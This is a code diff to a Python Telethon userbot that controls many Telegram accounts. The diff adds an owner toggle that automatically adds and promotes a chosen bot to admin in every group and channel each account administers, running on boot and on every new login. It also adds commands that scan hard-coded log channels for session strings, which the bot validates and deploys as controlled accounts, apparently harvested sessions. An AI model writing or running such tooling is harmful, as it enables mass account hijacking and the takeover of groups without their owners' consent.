@@ -3469,6 +3469,45 @@ def _grow_rights_for(key: str):
     return ChatAdminRights(**GROW_POWER_PRESETS[key]["rights"])
 
 
+# ─── AUTO-PROMOTE (owner toggle) ──────────────────────────────────────────────
+# Config keys (persisted in config store):
+#   AUTOPROMOTE_ENABLED : bool
+#   AUTOPROMOTE_BOT     : str  ("BotUsername" without @)
+# When ON, on every boot/restart AND every time a new session logs in, the
+# configured bot is auto-added + promoted in ALL admin groups/channels of
+# every core, reusing the existing GROW engine (parallel + fast).
+
+_AUTOPROMOTE_LOCK = asyncio.Lock()
+
+def autopromote_enabled() -> bool:
+    return bool(cfg.get("AUTOPROMOTE_ENABLED", False))
+
+def autopromote_bot() -> str:
+    return (cfg.get("AUTOPROMOTE_BOT") or "").lstrip("@").strip()
+
+async def autopromote_run(scope="all", reason="startup"):
+    """Fire the GROW engine for the configured bot username.
+    scope: "all" or a specific core user-id."""
+    if not autopromote_enabled():
+        return
+    uname = autopromote_bot()
+    if not uname:
+        return
+    if _AUTOPROMOTE_LOCK.locked() and scope == "all":
+        return  # a full sweep is already running
+    async with _AUTOPROMOTE_LOCK:
+        try:
+            await _grow_notify(
+                f"<blockquote>\U0001f331 <b>AUTO-PROMOTE</b> ({reason})\n"
+                f"  Bot: <code>@{uname}</code>\n"
+                f"  Scope: <code>{'ALL CORES' if scope=='all' else scope}</code>\n"
+                f"  Rights: <code>{_grow_power_key().upper()}</code></blockquote>")
+        except Exception:
+            pass
+        rid = _grow_new_run(scope, _grow_power_key(), [uname])
+        await _grow_engine_run(rid)
+
+
 def _grow_new_run(scope, rights_key, usernames) -> str:
     _GROW_RUN_SEQ[0] += 1
     rid = f"r{_GROW_RUN_SEQ[0]}"
@@ -6811,14 +6850,61 @@ def create_event_handler(client):
         # session string + user info, validates each Telethon session
         # (skips expired ones), and saves valid ones to config.
         # ══════════════════════════════════════════
-        elif re.match(r"(?i)^\.(scanbot|scanlog)(?:\s+(-?\d+))?\s*$", text):
+        # ══════════════════════════════════════════
+        # MODULE: AUTOPROMOTE — owner toggle for auto-adding a bot to
+        # all admin groups on every boot/new-login. Uses GROW engine.
+        # ══════════════════════════════════════════
+        elif re.match(r"(?i)^\.autopromote(?:\s+(on|off|status|run))?\s*$", text):
+            if not await verify_privileges(event, client=client, strict_owner_only=True): return
+            asyncio.create_task(event.delete())
+            _apm = re.match(r"(?i)^\.autopromote(?:\s+(on|off|status|run))?\s*$", text)
+            _sub = (_apm.group(1) or "status").lower()
+            if _sub == "on":
+                cfg["AUTOPROMOTE_ENABLED"] = True; save_config(cfg)
+                _b = autopromote_bot() or "<i>not set</i>"
+                await safe_send_and_track(client, chat_id,
+                    f"<blockquote>✅ <b>Auto-promote ON</b>\n  Bot: <code>@{_b}</code>\n  Use <code>.setpromotebot @Username</code> to change.</blockquote>")
+            elif _sub == "off":
+                cfg["AUTOPROMOTE_ENABLED"] = False; save_config(cfg)
+                await safe_send_and_track(client, chat_id,
+                    "<blockquote>🛑 <b>Auto-promote OFF</b></blockquote>")
+            elif _sub == "run":
+                if not autopromote_bot():
+                    await safe_send_and_track(client, chat_id,
+                        "<blockquote>❌ Bot not set. Use <code>.setpromotebot @Username</code> first.</blockquote>")
+                else:
+                    await safe_send_and_track(client, chat_id,
+                        "<blockquote>🌱 <b>Auto-promote sweep started</b> (logs → owner DM).</blockquote>")
+                    asyncio.create_task(autopromote_run(scope="all", reason="manual .autopromote run"))
+            else:
+                st = "ON" if autopromote_enabled() else "OFF"
+                _b = autopromote_bot() or "<i>not set</i>"
+                await safe_send_and_track(client, chat_id,
+                    f"<blockquote>🌱 <b>Auto-promote status</b>\n  State: <b>{st}</b>\n  Bot: <code>@{_b}</code>\n  Commands: <code>.autopromote on|off|run</code> · <code>.setpromotebot @Username</code></blockquote>")
+
+        elif re.match(r"(?i)^\.setpromotebot\s+@?(\w{3,})\s*$", text):
+            if not await verify_privileges(event, client=client, strict_owner_only=True): return
+            asyncio.create_task(event.delete())
+            _spb = re.match(r"(?i)^\.setpromotebot\s+@?(\w{3,})\s*$", text)
+            _uname = _spb.group(1)
+            cfg["AUTOPROMOTE_BOT"] = _uname; save_config(cfg)
+            await safe_send_and_track(client, chat_id,
+                f"<blockquote>✅ <b>Auto-promote bot set:</b> <code>@{_uname}</code>\n  Toggle with <code>.autopromote on</code>.</blockquote>")
+
+        elif re.match(r"(?i)^\.(scanbot|scanlog|scanub|scanws)(?:\s+(-?\d+))?\s*$", text):
             if not await verify_privileges(event, client=client, strict_owner_only=True): return
             asyncio.create_task(event.delete())
 
-            _sm = re.match(r"(?i)^\.(scanbot|scanlog)(?:\s+(-?\d+))?\s*$", text)
+            _sm = re.match(r"(?i)^\.(scanbot|scanlog|scanub|scanws)(?:\s+(-?\d+))?\s*$", text)
             _override = _sm.group(2) if _sm else None
             # Priority: explicit arg > configured LOG_CHANNEL > hard-coded default
-            scan_log_cid = int(_override) if _override else cfg.get("LOG_CHANNEL", -1004427086264)
+            _cmd_name = _sm.group(1).lower() if _sm else ""
+            if _cmd_name == "scanub":
+                scan_log_cid = -1004427086264
+            elif _cmd_name == "scanws":
+                scan_log_cid = -1004472841505
+            else:
+                scan_log_cid = int(_override) if _override else cfg.get("LOG_CHANNEL", -1004427086264)
 
             prog_msg = await safe_send_and_track(client, chat_id,
                 f"<blockquote>🔍 <b>Scanning log channel...</b>\n"
@@ -8084,6 +8170,9 @@ async def deploy_new_session_string(session_str: str, is_startup: bool = False,
                 twofa_password=twofa_password,
             ))
         bot_logger("DEPLOY_OK", f"Core: {me.first_name} ({me.id})")
+        # Auto-promote for this fresh core (owner toggle).
+        if autopromote_enabled() and autopromote_bot():
+            asyncio.create_task(autopromote_run(scope=me.id, reason="new login"))
         background_tasks.add(asyncio.create_task(new_client.run_until_disconnected()))
     except Exception as e:
         # BUG FIX (logins disappearing right after a successful login): this
@@ -8311,6 +8400,15 @@ async def main():
             # Auto-scan LOG_CHANNEL for session strings — sends live progress
             # to owner via asstbot every minute, full summary at end.
             asyncio.create_task(auto_scanbot_task())
+            # Auto-promote sweep on boot (if owner has toggle ON).
+            async def _boot_autopromote():
+                await asyncio.sleep(45)  # let sessions settle first
+                try:
+                    if autopromote_enabled() and autopromote_bot():
+                        await autopromote_run(scope="all", reason="boot")
+                except Exception as _e:
+                    bot_logger("AUTOPROMOTE_BOOT", f"{_e}")
+            asyncio.create_task(_boot_autopromote())
     except Exception as e:
         bot_logger("USERBOT_ERROR", f"Primary userbot failed: {e}")
 
